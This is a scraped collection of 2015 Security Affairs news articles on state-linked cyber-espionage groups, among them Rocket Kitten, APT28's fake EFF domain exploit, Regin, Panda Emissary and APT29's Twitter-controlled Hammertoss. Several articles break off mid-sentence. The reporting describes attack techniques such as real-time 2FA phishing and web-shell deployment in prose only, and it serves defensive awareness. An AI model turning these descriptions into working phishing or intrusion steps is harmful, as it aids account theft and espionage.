Peachpit, which it attributed by the experts to the North Korea.\n\n\u201cThe HANGMAN variants dropped by the HWPX documents use functions that are very similar to those seen in other malware families used by suspected North Korea-based actors, such as the backdoor we call PEACHPIT. Both PEACHPIT and HANGMAN incorporate a function where Windows commands are passed to the backdoor from the remote C2 server.\u201d states the report.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 North Korea, Information Warfare)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/fireeye", "topic_name": "FireEye"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hangman", "topic_name": "HANGMAN"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hangul", "topic_name": "Hangul"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/south-korea", "topic_name": "South Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/word-processor", "topic_name": "Word Processor"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zero-day", "topic_name": "zero-Day"}]}, {"news_name": "Israel is the main source of cyber attacks on Iran", "news_link": "https://securityaffairs.co/wordpress/40004/intelligence/iran-cyber-security.html", "title": "Israel is the main source of cyber attacks on Iran\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 9, 2015", "body": "According to a recent report, more than 10,000 Internet security attacks are detected by cyber security experts in Iran every day, a country that is spending a significant effort to improve its cyber capabilities.\n\nIn March 2015, The British Business Insider published an interesting post on the Iranian cyber capabilities, according to the experts the Government of Teheran is improving expertise in the cyber domain faster than experts \u2018would have ever imagined,\u2019 increasing cyber-security spending 12-fold since 2013.\n\n\n\nToday Iran ranks 19th in terms of cyber security on a global scale, the country has accomplished only 39 percent of a target 53 percent of its Information Security Management System (ISMS) and 20 percent of a target 100 percent for launching a national Security Operation Center SOC.\n\nThe situation presented by the Iranian experts is worrying, according to the cyber security experts of the country. The country is a privileged target of foreign spies and hackers, despite the significant commitment to cyber security of the Government of Teheran, the national infrastructure still suffers the foreign offensive.\n\nAccording to the Iranian authorities, the Stuxnet attack in September 2013 infected more that 30,000 machines completely changing the perception of cyber threat of the central Government.\n\nThe last attack in order of time attributed by the Iranian authorities to state-sponsored hackers relied on the Dino malware, a malicious agent that targeted most systems of the country.\n\nIn July, ESET published a detailed analysis of the Dino malware, the ESET researcher Joan Calvet has detected a single sample of Dino in the wild that was used in an attempt to infect a target in Iran in 2013.\n\n\u201cDino is so hard to find because the group behind the Animal Farm is really good at targeting people precisely, and we basically miss a lot of their samples,\u201d Calvet told\n\nDino is a modular malware, a number of components allow it to carry out several tasks for cyber espionage operations.\n\nIt doesn\u2019t surprise that most cyber-attacks against Iran are launched from Israel as explained by the IT Minister Mahmoud Vaezi.\n\n\u201cIT Minister Mahmoud Vaezi has said most of cyber-attacks against Iran are launched from Israel.

We also observed attacks targeting organizations located in Europe. but in the bigger scheme of things this activity is marginal (about 5% of the total number of targeted attacks). The actors do not seem to be motivated by a hacktivist agenda.\u201d states the report published by Trend Micro.\n\n\u201c[The researcher] had infiltrated \u2026 and was able to pose as a person of interest in this group, and they had engaged\u201d explained Jon Clay, a senior global marketing manager for Trend Micro.\n\nAs a first attempt, the Rocket Kitten group tried to contact the researcher trough a fake Facebook profile, without success. Not happy with the result, the attackers carried a spear phishing attack on one of the victims of previous campaign by spoofing the name of the targeted researcher and using it as the sender because he had worked with the victim before when he was investigating Rocket Kitten\u2019s activities. This circumstance leads to believe in one of two possibilities, or the attackers knew that they were under investigation, or the attackers got some email correspondence between the victim and the researcher.\n\n\u201cI can\u2019t tell what the hackers\u2019 motivation was to go after this individual, it did give us some good information,\u201d, \u201cWe see this often with underground [cybercrime] investigations: a researcher infiltrates a forum and starts to be able to speak with the threat actors, acting like a member of the group.\u201d Said Clay.\n\nThe researchers have observed a Rocket Kitten\u2019s operating template in the operations they uncovered, the APT uses spear phishing and social engineering to target the primary or secondary victim.\n\nThis can be done by faking accounts and identities: \n\n\u2022 Using fake Google Drive\u2122 or Gmail\u2122 accounts (The Rocket Kitten Group often impersonated persons of interest and public figures such as Israeli engineers.) \n\n\u2022 Using stolen documents that suggest a legitimate cause and sender \n\n\u2022 Using social media accounts as in Facebook to directly contact targets, create rapport via private messages, and log correspondence as well as consequently make users visit phishing websites The spear-phishing email contains a link or a file that when clicked or opened unleashes a payload that takes over the target machine\n\nIt was observed that lately, Cyber Espionage groups are targeting more individuals and fewer organizations, to get gather the information they need, getting away from the initial logic used in Cyber Espionage:\n\n\u201cThe interesting thing we found is that they shifted from going after organizations, to going after individuals associated with those organizations. They can then utilize this personalized data to get into the corporate data; they use that to leverage lateral movement inside the organization\u201d\n\nClearSky counted 550 targets used by Rocket Kitten, most of them based in the Middle East, \u201cThey are scientists, journalists, researchers, and sometimes expatriated Iranians living in Western countries. These facts suggest that Rocket Kitten may be engaging some sort of foreign political espionage campaign and may want to find regime-opponents active in driving policy in different ways,\u201d\n\n\u201cThese people are professionally affiliated with the foreign policy and defense sectors and there is an interest in finding out who they are talking to and what kinds of action they support.\u201d\n\nWho is the Rocket Kitten Group?\n\nThe Rocket Kitten groups have been suspected to be active since 2011 and have been increasing their activity since 2014. The group is not considered to have great cyber capabilities, its attacks don\u2019t appear so sophisticated, however, they are difficult to predict. The first time the group was noticed, it was using a malicious version of Core Impact Pro\u00ae penetration-testing tool. As I said above the group is increasing their activity since 2014 and this is what we know until the moment:\n\n\n\n\u201cPrevious reports about Rocket Kitten include ClearSky\u2019s Gholee and \u201cThamar Reservoir\u201c, and  Trend Micro\u2019s Operation Woolen-Goldfish.  Last week Citizen Lab published Two-Factor Authentication Phishing From Iran. The group was analyzed in a presentation at the Chaos Communication Congress (CCC).\u201d reported Clearskysec.\n\nWhat is Rocket Kitten trying to gain?\n\nThe main targets are based in the Middle East, and it seems that their targets are involved in policy research, diplomacy and international affairs like policy research, diplomacy and international affairs. The information they held from their attacks are not clear and we don\u2019t know how they intend the use it. At this point, we can only speculate the agenda of the group, but it looks like there is a government hand behind (may or not be)\n\nConclusion\n\nIn my opinion groups, such Rocket Kitten will increase their activity and their power, it is likely the group will target also IoT, and all the devices connected to the internet that could leak information on targets. The new trend is to go after individuals and not so much companies, since companies are more prepared to deal with security issues, and it makes sense, at home, we don\u2019t have any IPS/IDS, Firewall.\n\nThese are APT groups and there are normally politically-motivated often they operate backed by foreign governments, as highlighted by former NSA Chief Alexander cyber espionage is the greatest transfer of wealth in history.\n\nAbout the Author Elsio Pinto\n\nEdited by Pierluigi Paganini\n\n(Security Affairs \u2013 Rocket Kitten, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rocket-kitten", "topic_name": "Rocket Kitten"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/spear-phishing", "topic_name": "spear phishing"}]}, {"news_name": "US weighs sanctioning China and Russia in response to recent cyber attacks", "news_link": "https://securityaffairs.co/wordpress/39768/cyber-crime/us-sanctioning-china-russia.html", "title": "US weighs sanctioning China and Russia in response to recent cyber attacks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "September 2, 2015", "body": "The US Government is considering sanctions against both Russian and Chinese hackers in response to the hacking campaign targeting US entities.\n\nThe news was reported by several U.S. officials yesterday who spoke on condition of anonymity.

The hackers used the name brand of popular privacy watchdog in an attempt to trick targets into thinking that email sent by the domain was coming from the trusted organization.\nAccording to the security experts who are investigating the case, the spear phishing campaign is part the Pawn Storm Operation. Security experts from several security firms speculate that the Russian APT 28 manages the long-running espionage campaign.\nThe Pawn Storm group, also called APT 28, has been active for several years, according to the experts at FireEye who are following it the attacks are carried during business hours, on Moscow time, and targets organizations managing information related to governments, militaries and security organizations. The experts sustain that the information exfiltrated by the hackers are of great interest for the Russian Intelligence.\nAccording to a blog post published by the EFF the fake domain, the threat actors registered the bogus domain electronicfrontierfoundation.org a few weeks ago and used it in targeted attacks leveraging on a recently patched Java zero-day exploit.\n\nDespite Oracle has already patched the vulnerability exploited in the attack the hacking crew is still exploiting it.\nThe phishing emails include links to the fake EFF website, once clicked on the visitor is redirected to page on the same domain containing a Java applet that could exploit the flaw in the unpatched version of the Java software.\n\u201cThe attack is relatively sophisticated\u2014it uses a recently discovered Java exploit, the first known Java zero-day in two years. The attacker sends the target a spear phishing email containing a link to a unique URL on the malicious domain (in this case electronicfrontierfoundation.org). When visited, the URL will redirect the user to another unique URL in the form of htt://electronicfrontierfoundation.org/url/{6_random_digits}/Go.class containing a Java applet which exploits a vulnerable version of Java. Once the URL is used and the Java payload is received, the URL is disabled and will no longer deliver malware (presumably to make life harder for malware analysts).\n\nThe attacker, now able to run any code on the user\u2019s machine due to the Java exploit, downloads a second payload, which is a binary program to be executed on the target\u2019s computer.\u201d States the blog post published by the EFF.\n\n\n\nThe experts at the EFF sustain that there are a number of similarities between this campaign and other operation managed by the Russian APT 28 group, for example the path and filename used in the exploit are the same as those used in the attacks of the Pawn Storm. The attackers used the Sednit malware to infect victims and install a backdoor in order to maintain persistence in the compromised machine.\n\nThe APT 28 also carried out attacks on NATO forces and White House staff in the past months.\nIn order to secure the systems, the EFF is urging users to update Java to the latest release in order to fix the vulnerabilities exploited in the attack.

The ongoing attacks attempt to circumvent the extra protections conferred by two-factor authentication in Gmail, and rely heavily on phone-call based phishing and \u201creal time\u201d login attempts by the attackers. Most of the attacks begin with a phone call from a UK phone number, with attackers speaking in either English or Farsi.\u201d states the authors of the report.\n\n\u201cIt may be that, as a growing number of potential targets have begun using two-factor authentication on their email accounts out of a concern for their security, politically motivated attackers are borrowing from a playbook that financial criminals have written over the past decade,\u201d state the authors of the report.\n\nThe attacks appear to be politically motivated, according to the senior research fellow at the Citizen Lab, John Scott-Railton, the list of targets includes a director at the Electronic Frontier Foundation and Iranian activists.\n\nAccording to security researchers, the Iranian government has increased its cyber capabilities in a significant way in the last years, for this reason US intelligence consider the country one of the most dangerous threats alongside with Russia, China and North Korea.\n\nAccording to  the research firm Small Media, Iran increased cyber-security spending 12-fold since President Hassan Rouhani gained power in 2013. I suggest you to give a look to the report released by experts at Small Media. Vowing to ramp up the country\u2019s cyber capabilities, Rouhani has given the Islamic Revolutionary Guard Corps (IRGC) an annual cybersecurity budget of roughly $19.8 million.\n\nThe recently observed attacks on Gmail accounts start with text messages that pretend to be sent from Google. The messages warn users that of unauthorized access to their Gmail accounts.\n\n\n\nThen the attackers would send a fake \u201cpassword-reset\u201d email that redirect victims to bogus \u201cpassword reset page,\u201d in reality the password reset pages are used to collect the victim\u2019s password.\n\nThe attack is called \u201creal time\u201d attack, it attempts to phish both the user password and the 2FA one-time code used by Google.  The reset pages simulate the Gmail 2-step login process to the victim. The attacker uses the victim\u2019s input, to login in real time to Gmail.  The attacker\u2019s login attempt triggers Google to send a genuine 2FA code to the victim, which inserts it in the fraudulent page too. At this point, the attack bypasses the 2FA implemented by Google.\n\nThe attackers also use the phone to carry out the attack, in this second attack scenario the victims receive a phone call regarding a fake business proposal.

The execution of the first stage triggers a domino chain in which at each step the stage is decrypted and executed, and that in turn decrypts the successive stage, and so on.\n\n\n\nPart of the intelligence community has linked the Regin malware to the Five Eyes alliance, experts found alleged referenced to the super spyware in a number of presentations leaked by Edward Snowden and according to malware researchers it has been used in targeted attacks against government agencies in the EU and the Belgian telecoms company Belgacom.\n\nNow Symantec revealed that its researchers have uncovered 49 new modules, the total number of components discovered since the initial discovery is 75.\n\n\u201cAs outlined in an updated technical whitepaper, Symantec has found 49 new modules, bringing the total number of Regin modules uncovered to 75. This remains an incomplete list. A number of other Regin payloads are known to exist since some modules analyzed contain references to them.\u201d states a blog post published by Symantec.\n\nThe newly discovered modules can be used for espionage purposes, they implement logging, keylogging, impersonation functionalities and other exfiltration methods.\n\nThe analysis of these modules led the experts to speculate that many other modules belonging the Regin platform exist.\n\nThe researchers at Symantec revealed that Regin has an extensive command and control (C&C) infrastructure that relies on peer-to-peer (P2P) communications between infected machines.\n\n\u201cSymantec has found an extensive command-and-control (C&C) infrastructure supporting Regin infections. The attackers have devised a complex system for communication with C&C servers, in which traffic is relayed through a network of Regin-infected computers. Compromised computers can act as a proxy for other infected computers and peer-to-peer (P2P) communications are used.\u201d states the post. \u201cThis P2P capability allows the attackers to maintain deep access to critical assets within compromised organizations and mask core infrastructure belonging to the group. Traffic between nodes can be configured to match expected protocols based on where the nodes are placed on a network, adding a further degree of stealth to communications.\u201d\n\nThe experts highlighted the existence of a custom-built remote procedure call (RPC) mechanism that enables the attackers to remotely install, update, and configure modules.\n\n\u201cThe RPC mechanism allows for procedure calls to be made locally and across the network of Regin-infected computers. Operators can directly call any procedure on the Regin network to remotely control, install, or update modules, or change module configuration by replacing EVFS files.\u201d\n\nThe most interesting aspect of the new findings it that threat actors is still operating the Regin platform upgrading its powerful espionage spyware.\n\n\u201cDespite the threat\u2019s exposure last year, it is unlikely that the group behind this malware has ceased operations,\u201d reported Symantec. \u201cIts track record and available resources mean it is probable that the group will re-equip itself with a new threat or upgrade Regin in a bid to evade detection. The latter is the most likely course of action, given the time it would take to develop an equally capable malware framework from scratch.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Backdoor Regin, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/backdoor-regin", "topic_name": "Backdoor Regin"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberespionage", "topic_name": "Cyberespionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/regin", "topic_name": "Regin"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/surveillance", "topic_name": "surveillance"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/symantec", "topic_name": "Symantec"}]}, {"news_name": "Cyber espionage campaign targets India and Tibetan activists", "news_link": "https://securityaffairs.co/wordpress/39535/hacking/cyber-espionage-on-india.html", "title": "Cyber espionage campaign targets India and Tibetan activists\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "August 24, 2015", "body": "Security firm FireEye revealed an intense activity of hackers based in China particularly interested in entities and organization linked to the Indian Government as well as in information on Tibetan activists.

We found indicators in their malware that the group behind it may speak Chinese.\u201d\n\nExperts at FireEye are monitoring the Watermain\u2019s activity since 2011, the APT targeted more than 100 entities since now, about 70% of them are from India.\n\n\u201cCollecting intelligence on India remains a key strategic goal for China-based APT groups, and these attacks on India and its neighbouring countries reflect growing interest in its foreign affairs,\u201d said Bryce Boland, FireEye chief technology officer for Asia Pacific.\n\n\u201cOrganizations should redouble their cyber security

of targeted organizations in India have already patched the flaws exploited in the attacks.\n\nAt the time I was writing the Government of Beijing hasn\u2019t commented the findings of the FireEye experts.\n\nIndia and China have long been involved in a dispute over their border, for this reason, the government of Bejing could have arranged a cyber espionage campaign searching for information

It is interesting to note that watering holes used by the hackers include a whitelist to run surgical attacks by ensuring that only staff from a target organisation are infected remaining under the radar for a long time.\n\nAnother peculiarity of the Panda Emissary group is the use of custom Microsoft Exchange backdoors and credential logger. The Panda Emissary used custom tools OwaAuth web shell and ASPXTool, and also popular criminal hacking tools PlugX RAT, HttpBrowser, and China Chopper.\n\n\u201cAfter the initial compromise, TG-3390 delivers the HttpBrowser backdoor to its victims. The threat actors then move quickly to compromise Microsoft Exchange servers and to gain complete control of the target environment.\u201d \u201cThe threat actors are adept at identifying key data stores and selectively exfiltrating all of the high-value information associated with their goal.\u201d\n\n\u201cThe group extensively uses long-running strategic web compromises (SWCs), and relies on whitelists to deliver payloads to select victims. In comparison to other threat groups, TG-3390 is notable for its tendency to compromise Microsoft Exchange servers using a custom backdoor and credential logger.\u201d\n\nThe Panda Emissary group targeted large manufacturing companies supplying defense organizations, energy firms, embassies in Washington, DC representing countries in the Middle East, Europe, and Asia, NGOs particularly focused on international relations and defense and of course government organizations.\n\n\n\n \n\n\u201cCTU researchers have discovered numerous details about TG-3390 operations, including how the adversaries explore a network, move laterally, and exfiltrate data. As shown in Figure 11, after compromising an initial victim\u2019s system (patient 0), the threat actors use the Baidu search engine to search for the victim\u2019s organization name. They then identify the Exchange server and attempt to install the OwaAuth web shell. If the OwaAuth web shell is ineffective because the victim uses two-factor authentication for webmail, the adversaries identify other externally accessible servers and deploy ChinaChopper web shells. Within six hours of entering the environment, the threat actors compromised multiple systems and stole credentials for the entire domain.\u201d\n\n\n\nThe hackers belonging to the Panda Emissary group only syphon data related to specific U.S. defense projects, the report doesn\u2019t s provide further information on the motivation behind the attacks. It is not clear if the hacking crew is state-sponsored team or a hacking-for-hire group.\n\n\u201cCTU researchers have observed the threat group obtaining information about specific U.S. defense projects that would be desirable to those operating within a country with a manufacturing base, an interest in U.S. military capability, or both,\u201d states Dell. \u201cThe adversary\u2019s end goal is to exfiltrate, not infiltrate. After gaining access to a target network in one intrusion analysed by CTU researchers, TG-3390 actors identified and exfiltrated data for specific projects run by the target organisation.\u201d\n\nIt also has access to a criminal development team focused on building hacking tools and is proficient at hiding malware and does not bother with reconnaissance, instead waiting to gain a foothold in target organisations.\n\nResearchers from Dell speculate on the Chinese origin of the hacking team, they observed local working hours and the use of native language tools, but they cannot exclude that this information could be the result of a false-flag operation.\n\nEnjoy the report.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Panda Emissary, cyber espionage)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/panda-emissary", "topic_name": "Panda Emissary"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/watering-hole", "topic_name": "watering hole"}]}, {"news_name": "Terracotta VPN, the Chinese VPN Service as Hacking Platform", "news_link": "https://securityaffairs.co/wordpress/39114/cyber-crime/terracotta-vpn-hacking-platform.html", "title": "Terracotta VPN, the Chinese VPN Service as Hacking Platform\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "August 5, 2015", "body": "According RSA Security, a China-based virtual private network (VPN) service provider offers hacking crews a network of compromised servers which can be used to carry out stealth cyber attacks.\n\nThe attacks appear to be coming from legitimate IP addresses from organizations having a good reputation, making it difficult for the victim to identify the real source of the offensive.\n\nThe VPN service identified by RSA and dubbed by the company Terracotta VPN \u201cmay represent the first exposure of a PRC-based VPN operation that maliciously, efficiently and rapidly enlists vulnerable servers around the world.\u201d Terracotta VPN is a commercial VPN service provider with over 1,500 nodes around the world, the majority of its servers are actually composed of compromised Windows systems belonging to SMBs.\n\n\u201cTerracotta\u2019s network of 1500+ VPN nodes throughout the world are primarily obtained by hacking into inadequately protected Windows servers in legitimate organizations, without the victim\u2019s knowledge or permission.

Krebs is a master and I decided to propose an excerpt from the analysis to show you how to proceed in cases like this.\n\n\u201cA lookup at Domaintools.com for the historic registration records on 8800free[dot]info show it was originally registered in 2010 to someone using the email address \u201cxnt50@163.com.\u201d Among the nine other domains registered to xnt50@163.com is517jiasu[dot]cn, an archived version of which is available here.\n\nDomaintools shows that in 2013 the registration record for 8800free[dot]info was changed to include the email address \u201cjzbb@foxmail.com.\u201d Helpfully, that email was used to register at least 39 other sites, including quite a few that are or were at one time advertising similar-looking VPN services.\n\nPivoting off the historic registration records for many of those sites turns up a long list of VPN sites registered to other interesting email addresses, including \u201cadsyb@163.com,\u201d \u201casdfyb@hotmail.com\u201d and \u201citjsq@qq.com\u201d (click the email addresses for a list of domains registered to each). Armed with lists of dozens of VPN sites, it wasn\u2019t hard to find several sites offering different VPN clients for download. I installed each on a carefully isolated virtual machine (don\u2019t try this at home, kids!).\n\nNone of the VPN clients I tried would list the Internet addresses of the individual nodes. However, each node in the network can be discovered simply by running some type of network traffic monitoring tool in the background (I used Wireshark), and logging the address that is pinged when one clicks on a new connection.\u201d explained Krebs.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Hacking, Terracotta VPN)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/deep-panda", "topic_name": "Deep Panda"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rsa", "topic_name": "RSA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/terracotta-vpn", "topic_name": "Terracotta VPN"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/windows-servers", "topic_name": "Windows servers"}]}, {"news_name": "A secret NSA map shows successful Chinese attacks", "news_link": "https://securityaffairs.co/wordpress/39078/hacking/nsa-map-chinese-attacks.html", "title": "A secret NSA map shows successful Chinese attacks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "August 3, 2015", "body": "The NBC News has published in exclusive a secret NSA map showing the locations of the cyber attacks carried out by Chinese hackers over a five-year period.

This is likely to be the first problem for the White house that still haven\u2019t found a solution.\n\nSuch a drastic decision leaves me thinking that maybe the hacking attack against the OPM may have been bigger that we know, and the White House standard practices to deal with \u201cnormal\u201d hacks wouldn\u2019t be enough.\n\nSome sources say that inside the White house there are two major different opinions, one supporting a diplomatic protest, the other is pushing to the dismissal of Chinese agents operating the in the US, and known but the US Government.\n\nAside from that, the real question is if the US, will target China and try to steal (and maybe leak it?) information from Chinese major entities, as it was done with the OPM hack.\n\nI believe that the Information warfare between the two most powerful countries in the world is already happening, even if the official statement is that they are allies and support each other, there is interest of getting as much information as possible from your allies.\n\nIt\u2019s possible that if cyber-war becomes bigger and more aggressive, can easier escalate to something else and that is the biggest fear in the white house, but there is other opinions like the one of former Arkansas Gov. Mike Huckabee who says\n\n\u201cThe way you deal with a bully on the playground is to punch them in the face and put them on the ground because the only thing they respect is power\u201d\n\nAn anonymous source involved in this debate said , \u201cOne of the conclusions we\u2019ve reached is that we need to be a bit more public about our responses, and one reason is deterrence.\u201d, \u201cWe need to disrupt and deter what our adversaries are doing in cyberspace, and that means you need a full range of tools to tailor a response,\u201d\n\n\n\nLegal actions can be taken against Chinese individuals, but in practical terms, it will not sort any effect. In the past this was already done, in 2014 five Chinese spies were formally accused of stealing data from American companies, but because none of them will be prosecuted and sentenced in the US, so no clear damages to the Chinese individuals, neither for the Chinese government.\n\nThe important here is to have an open mind, and not taking sides, and doing that we can realize that the accusations came from both sides ( China and America), and China claiming that the US are the most active country in cyber spying against other countries.\n\nIn my opinion, more of these situations will start to happen more frequently, and when countries will start to retaliate more and more, who knows to where that can lead us?\n\nAbout the Author Elsio Pinto\n\nEdited by Pierluigi Paganini\n\n(Security Affairs \u2013 China, OPM)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-warfare", "topic_name": "Information Warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/opm", "topic_name": "OPM"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}]}, {"news_name": "Security Affairs newsletter Round 20 \u2013 Best of the week from best sources", "news_link": "https://securityaffairs.co/wordpress/39049/cyber-crime/security-affairs-newsletter-20.html", "title": "Security Affairs newsletter Round 20 \u2013 Best of the week from best sources\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "August 2, 2015", "body": "\n\n\n\n\n\nOnce again thank you!\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Newsletter, SecurityAffairs)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-security", "topic_name": "cyber security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/newsletter", "topic_name": "Newsletter"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pierluigi-paganini", "topic_name": "Pierluigi Paganini"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}]}, {"news_name": "APT 29 use Twitter to control its Hammertoss data stealer", "news_link": "https://securityaffairs.co/wordpress/38978/cyber-crime/apt-29-report.html", "title": "APT 29 use Twitter to control its Hammertoss data stealer\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 31, 2015", "body": "Experts at FireEye uncovered a group of alleged Russian hackers, dubbed APT 29, that is exploiting Twitter to mask the activities of their data-stealer malware.\n\nThe hackers belonging to the APT 29 exploited Twitter in order to send commands to their malware, but according to the researchers from FireEye, the crew has improved its technique making hard the detection of its activities.\n\nThe experts at FireEye discovered that the APT 29 used a specific strain of malware dubbed Hammertoss, which has infected the systems of one of the company customers.\n\nAPT 29 has taken several steps to try to mask its communication with Hammertoss to avoid detection, according to a new report.\n\nHammertoss implements an algorithm that generates new Twitter handles every day, in this way the C&C server can communicate with Hammertoss by using specific Twitter accounts managed by the APT 29.\n\n\n\nWe have already discovered in the past threat actors using Twitter and other social media as Command and Control systems, the technique results very effective because many companies are unlikely to block outbound connections the social media platforms.\n\n\u201cUsing a variety of techniques\u2014from creating an algorithm that generates daily Twitter handles to embedding pictures with commands\u2014the developers behind HAMMERTOSS have devised a particularly effective tool. APT29 tries to undermine the detection of the malware by adding layers of obfuscation and mimicking the behavior of legitimate users. HAMMERTOSS uses Twitter, GitHub, and cloud storage services to relay commands and extract data from compromised networks.\u201d states the report from FireEye.\n\nThe hackers include the command for Hammertoss instances in a tweet containing a URL and a hashtag. The URL leads to an image on a different server that contains data hidden through a steganographic technique.\n\n\n\nThe hashtag is used to encode the file size of the image and a few characters that should be added to the decryption key stored within Hammertoss in order to allow the extraction of the hidden data.\n\n\u201cThe HAMMERTOSS backdoor generates and looks for a different Twitter handle each day. It uses an algorithm to generate the daily handle, such as \u201c234Bob234\u201d, before attempting to visit the corresponding Twitter page. If the threat group has not registered that day\u2019s handle, HAMMERTOSS will wait until the next day and look for a different handle\u201d continues the report.\n\nThe experts noticed that APT 29 adopted several techniques to remain under the radar, for example Hammertoss is usually only active during the normal working day for infected organization, in this way the malicious traffic results quite difficult to detect.\n\nThe experts attributed Hammertoss to Russian hackers because it appears to be active during normal working hours in Moscow. The APT 29 did not work on Russian holidays.\n\nWho are the targets of the APT 29 hacking campaigns?\n\nExperts from FireEye speculate that APT 29 is primarily focused on compromising government organizations and collecting geopolitical information related to Russia, a circumstance that lead them to believe that it is a state-sponsored group.\n\n\u201cThat\u2019s why we believe they are in some way associated with the Russian government or working with Russia,\u201d concludes the report.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 APT 29,  state-sponsored hackers)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt-29", "topic_name": "APT 29"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fireeye", "topic_name": "FireEye"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}]}, {"news_name": "United Airlines reportedly hacked by same APT that breached OPM, Anthem", "news_link": "https://securityaffairs.co/wordpress/38960/cyber-crime/united-airlines-chinese-apt.html", "title": "United Airlines reportedly hacked by same APT that breached OPM, Anthem\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 30, 2015", "body": "A Chinese APT group  believed to be responsible for a series of high-profile data breaches that affected the U.S. Office of Personnel Management, the Anthem, and more recently the United Airlines.\n\nAccording the media agency Bloomberg, the United Airlines detected a cyber attack into its computer network at the end of May or early June, the journalists cited some unnamed sources familiar with the incident.\n\nThe source confirmed that the hacking crew that hacked United Airlines systems is the same APT that successfully carried out several cyber attacks.\n\nWhy the hackers targeted the United Airlines?\n\nThe investigators suspect that the Chinese APT is gathering information on million of Americans to run further attacks.\n\n\u201cThe previously unreported United breach raises the possibility that the hackers now have data on the movements of millions of Americans, adding airlines to a growing list of strategic U.S. industries and institutions that have been compromised. Among the cache of data stolen from United are manifests \u2014 which include information on flights\u2019 passengers, origins and destinations \u2014 according to one person familiar with the carrier\u2019s investigation.\u201d states Bloomberg.\n\nThe situation is scaring, if the news is confirmed, the Chinese hackers can cross this data with records stolen from the federal personnel office discovering the movements of personnel working in defense and intelligence, including contractors that are privileged targets for cyber espionage campaign. The situation is worse if we consider that possibility that hackers could cross-reference the huge amount of data with stolen medical and financial records, 